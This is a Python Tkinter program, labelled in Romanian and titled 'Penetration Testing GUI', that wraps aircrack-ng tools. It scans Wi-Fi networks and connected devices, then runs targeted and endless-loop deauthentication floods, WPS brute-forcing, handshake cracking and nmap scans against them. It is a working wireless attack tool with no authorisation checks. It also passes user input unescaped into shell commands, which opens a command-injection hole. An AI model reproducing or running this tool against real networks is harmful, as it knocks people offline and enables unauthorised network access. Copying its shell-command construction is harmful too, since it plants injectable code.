import os
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
from threading import Thread

def start_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng start {interface}")
        Thread(target=scan_wifi, args=(interface,)).start()
    else:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")

def stop_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng stop {interface}")
        wifi_listbox.delete(0, tk.END)
        devices_listbox.delete(0, tk.END)
    else:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")

def scan_wifi(interface):
    wifi_listbox.delete(0, tk.END)
    os.system(f"timeout 5 airodump-ng {interface} -w /tmp/networks --output-format csv")

    try:
        with open("/tmp/networks-01.csv", "r") as file:
            lines = file.readlines()[2:]

            for line in lines:
                if len(line.split(',')) > 13:
                    bssid, channel, essid = line.split(',')[0].strip(), line.split(',')[3].strip(), line.split(',')[13].strip()
                    if essid:
                        wifi_listbox.insert(tk.END, f"{essid} ({bssid}) - canal {channel}")

    except FileNotFoundError:
        messagebox.showerror("Eroare", "Nu s-au putut scana rețelele.")

def select_wifi(event):
    devices_listbox.delete(0, tk.END)
    selection = wifi_listbox.get(wifi_listbox.curselection())
    bssid = selection.split("(")[1].split(")")[0]
    selected_bssid.set(bssid)

    result_display.insert(tk.END, f"[INFO] Selectat rețea: {selection}\n", "info")

    interface = interface_entry.get()
    Thread(target=scan_devices_live, args=(bssid, interface)).start()

def scan_devices_live(bssid, interface):
    result_display.insert(tk.END, f"[INFO] Scanare live pentru dispozitive conectate la BSSID: {bssid}\n", "info")

    scan_command = f"airodump-ng --bssid {bssid} --channel {channel_entry.get()} {interface}"
    with os.popen(scan_command) as scan_output:
        for line in scan_output:
            if "Station MAC" in line or len(line.strip().split()) < 2:
                continue

            station_mac = line.split()[0].strip()
            if station_mac not in [devices_listbox.get(i) for i in range(devices_listbox.size())]:
                devices_listbox.insert(tk.END, f"Dispozitiv: {station_mac}")

def select_device(event):
    selection = devices_listbox.get(devices_listbox.curselection())
    station_mac = selection.split(": ")[1]
    selected_device.set(station_mac)
    result_display.insert(tk.END, f"[INFO] Selectat dispozitiv: {station_mac}\n", "info")

def execute_command(command):
    result_display.insert(tk.END, f"[EXEC] {command}\n", "exec")
    result_display.insert(tk.END, os.popen(command).read(), "exec")

def attack_deauth():
    bssid = selected_bssid.get()
    station_mac = selected_device.get()
    if bssid and station_mac:
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} -c {station_mac} {interface_entry.get()}")
    else:
        messagebox.showerror("Eroare", "Selectează o rețea și un dispozitiv valid pentru atacul deauth.")

def deauth_flood():
    bssid = selected_bssid.get()
    interface = interface_entry.get()
    if bssid and interface:
        result_display.insert(tk.END, "[INFO] Atac deauth flood continuu lansat...\n", "info")
        Thread(target=continuous_deauth, args=(bssid, interface), daemon=True).start()
    else:
        messagebox.showerror("Eroare", "Selectează un BSSID și o interfață validă pentru atac.")

def continuous_deauth(bssid, interface):
    try:
        while True:
            os.system(f"aireplay-ng --deauth 1000 -a {bssid} {interface}")
    except KeyboardInterrupt:
        result_display.insert(tk.END, "[INFO] Atac deauth flood oprit.\n", "info")

root = tk.Tk()
root.title("Penetration Testing GUI")
root.geometry("1200x700")
root.configure(bg="black")

left_frame = tk.Frame(root, bg="black")
left_frame.place(x=20, y=20, width=350, height=660)

tk.Label(left_frame, text="Interfață Wi-Fi:", bg="black", fg="cyan").pack(pady=5)
interface_entry = tk.Entry(left_frame, bg="gray", fg="cyan")
interface_entry.pack(pady=5)

tk.Button(left_frame, text="Pornește Monitor Mode", command=start_monitor, bg="gray", fg="cyan").pack(pady=5)
tk.Button(left_frame, text="Oprește Monitor Mode", command=stop_monitor, bg="gray", fg="cyan").pack(pady=5)

tk.Label(left_frame, text="Rețele disponibile:", bg="black", fg="cyan").pack(pady=5)
wifi_listbox = tk.Listbox(left_frame, bg="black", fg="cyan", width=50, height=10)
wifi_listbox.pack(pady=5)
wifi_listbox.bind("<<ListboxSelect>>", select_wifi)

tk.Label(left_frame, text="Dispozitive conectate:", bg="black", fg="cyan").pack(pady=5)
devices_listbox = tk.Listbox(left_frame, bg="black", fg="cyan", width=50, height=10)
devices_listbox.pack(pady=5)
devices_listbox.bind("<<ListboxSelect>>", select_device)

selected_bssid = tk.StringVar()
selected_device = tk.StringVar()

right_frame = tk.Frame(root, bg="black")
right_frame.place(x=400, y=20, width=770, height=660)

result_display = scrolledtext.ScrolledText(right_frame, bg="black", fg="light green", width=92, height=18)
result_display.pack(pady=10)
result_display.tag_config("info", foreground="cyan")
result_display.tag_config("exec", foreground="light green")

button_frame = tk.Frame(right_frame, bg="black")
button_frame.pack(pady=10)

buttons = [
    ("Atac Deauth", attack_deauth),
    ("Deauth Flood", deauth_flood),
    ("Scanare Nmap", lambda: execute_command("nmap -A 192.168.0.1")),
    ("Brute-Force WPS", lambda: execute_command("bully -b 00:11:22:33:44:55 -v")),
    ("Sparge Handshake", lambda: execute_command("aircrack-ng -w wordlist.txt handshake.cap")),
    ("Scanare completă", lambda: execute_command("airodump-ng wlan0mon"))
]

for i, (text, cmd) in enumerate(buttons):
    tk.Button(button_frame, text=text, command=cmd, bg="gray", fg="light green", width=25).grid(row=i//3, column=i%3, padx=5, pady=5)

root.mainloop()
